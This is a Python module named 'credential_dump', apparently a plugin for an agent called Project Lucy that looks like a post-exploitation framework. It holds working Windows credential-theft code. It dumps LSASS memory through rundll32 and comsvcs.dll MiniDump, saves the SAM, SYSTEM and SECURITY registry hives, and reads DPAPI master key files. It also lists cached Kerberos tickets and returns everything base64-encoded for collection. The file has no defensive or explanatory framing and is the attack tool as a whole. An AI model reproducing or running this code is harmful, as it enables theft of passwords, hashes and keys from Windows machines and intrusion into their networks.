"""
Credential dump module for Project Lucy agent.
Extracts credentials from LSASS memory, registry hives, DPAPI master keys,
and cached Kerberos tickets on Windows.
Actions: lsass, registry, dpapi, kerberos.
"""
import base64
import os
import platform
import subprocess
import tempfile

name = "credential_dump"
version = "1.0.0"
os_compat = ["Windows"]
dependencies: list[str] = []

SYSTEM = platform.system()


def _get_lsass_pid() -> int | None:
    """Find the LSASS process PID via tasklist."""
    try:
        out = subprocess.check_output(
            ["tasklist", "/FI", "IMAGENAME eq lsass.exe", "/FO", "CSV", "/NH"],
            text=True, errors="replace", timeout=10,
        )
        for line in out.splitlines():
            parts = line.strip().strip('"').split('","')
            if len(parts) >= 2 and "lsass" in parts[0].lower():
                return int(parts[1])
    except Exception:
        pass
    return None


def _lsass_dump() -> dict:
    """Attempt to dump LSASS via comsvcs.dll MiniDump; return base64 of dump."""
    pid = _get_lsass_pid()
    if pid is None:
        return {"status": "failed", "error": "Could not find LSASS process"}

    tmp_dir = tempfile.gettempdir()
    dump_path = os.path.join(tmp_dir, f"lsass_{pid}.dmp")

    try:
        # Use rundll32 + comsvcs.dll MiniDump (requires admin / SeDebugPrivilege)
        cmd = [
            "rundll32.exe",
            "C:\\Windows\\System32\\comsvcs.dll",
            "MiniDump",
            str(pid),
            dump_path,
            "full",
        ]
        subprocess.run(cmd, capture_output=True, timeout=30)

        if not os.path.exists(dump_path) or os.path.getsize(dump_path) == 0:
            # Fallback: return process info
            return {
                "status": "failed",
                "error": "MiniDump failed (admin required?)",
                "data": {"pid": pid, "process": "lsass.exe"},
            }

        with open(dump_path, "rb") as f:
            dump_data = f.read()

        b64 = base64.b64encode(dump_data).decode()

        return {
            "status": "completed",
            "data": {
                "pid": pid,
                "dump_base64": b64,
                "dump_size": len(dump_data),
            },
        }

    except Exception as exc:
        return {
            "status": "failed",
            "error": str(exc),
            "data": {"pid": pid, "process": "lsass.exe"},
        }
    finally:
        try:
            if os.path.exists(dump_path):
                os.remove(dump_path)
        except Exception:
            pass


def _registry_dump() -> dict:
    """Read SAM/SYSTEM/SECURITY hive backup paths and attempt reg save."""
    hives = ["SAM", "SYSTEM", "SECURITY"]
    results = []
    tmp_dir = tempfile.gettempdir()

    for hive in hives:
        entry = {"hive": hive, "saved": False, "path": None, "base64": None}
        try:
            save_path = os.path.join(tmp_dir, f"{hive}.save")
            cmd = ["reg", "save", f"HKLM\\{hive}", save_path, "/y"]
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
            if proc.returncode == 0 and os.path.exists(save_path):
                with open(save_path, "rb") as f:
                    data = f.read()
                entry["saved"] = True
                entry["path"] = save_path
                entry["base64"] = base64.b64encode(data).decode()
                entry["size"] = len(data)
                # Clean up the saved hive
                try:
                    os.remove(save_path)
                except Exception:
                    pass
            else:
                entry["error"] = proc.stderr.strip() or proc.stdout.strip() or "reg save failed"
        except Exception as exc:
            entry["error"] = str(exc)
        results.append(entry)

    return {"status": "completed", "data": {"hives": results}}


def _dpapi_dump() -> dict:
    """Enumerate DPAPI master keys from %APPDATA%\\Microsoft\\Protect."""
    appdata = os.environ.get("APPDATA", "")
    protect_dir = os.path.join(appdata, "Microsoft", "Protect")
    master_keys = []

    if not os.path.isdir(protect_dir):
        return {"status": "failed", "error": f"DPAPI directory not found: {protect_dir}"}

    try:
        for sid_dir in os.listdir(protect_dir):
            sid_path = os.path.join(protect_dir, sid_dir)
            if not os.path.isdir(sid_path):
                continue
            for fname in os.listdir(sid_path):
                fpath = os.path.join(sid_path, fname)
                if not os.path.isfile(fpath):
                    continue
                try:
                    stat = os.stat(fpath)
                    with open(fpath, "rb") as f:
                        data = f.read()
                    master_keys.append({
                        "sid": sid_dir,
                        "filename": fname,
                        "path": fpath,
                        "size": stat.st_size,
                        "base64": base64.b64encode(data).decode(),
                    })
                except Exception:
                    master_keys.append({
                        "sid": sid_dir,
                        "filename": fname,
                        "path": fpath,
                        "error": "could not read",
                    })
    except Exception as exc:
        return {"status": "failed", "error": str(exc)}

    return {"status": "completed", "data": {"master_keys": master_keys, "count": len(master_keys)}}


def _kerberos_dump() -> dict:
    """List cached Kerberos tickets via klist."""
    try:
        out = subprocess.check_output(
            ["klist", "tickets"], text=True, errors="replace", timeout=10,
        )
        tickets = []
        current = {}
        for line in out.splitlines():
            line = line.strip()
            if line.startswith("#") and ">" in line:
                if current:
                    tickets.append(current)
                current = {"header": line}
            elif ":" in line and current:
                key, _, val = line.partition(":")
                current[key.strip().lower().replace(" ", "_")] = val.strip()
        if current:
            tickets.append(current)

        return {"status": "completed", "data": {"raw": out, "tickets": tickets, "count": len(tickets)}}
    except FileNotFoundError:
        return {"status": "failed", "error": "klist not found"}
    except Exception as exc:
        return {"status": "failed", "error": str(exc)}


def run(action: str = "lsass", **params) -> dict:
    if SYSTEM != "Windows":
        return {"status": "failed", "error": "Windows-only action"}

    try:
        if action == "lsass":
            return _lsass_dump()
        elif action == "registry":
            return _registry_dump()
        elif action == "dpapi":
            return _dpapi_dump()
        elif action == "kerberos":
            return _kerberos_dump()
        return {"status": "failed", "error": f"Unknown action: {action}"}
    except Exception as exc:
        return {"status": "failed", "error": str(exc)}
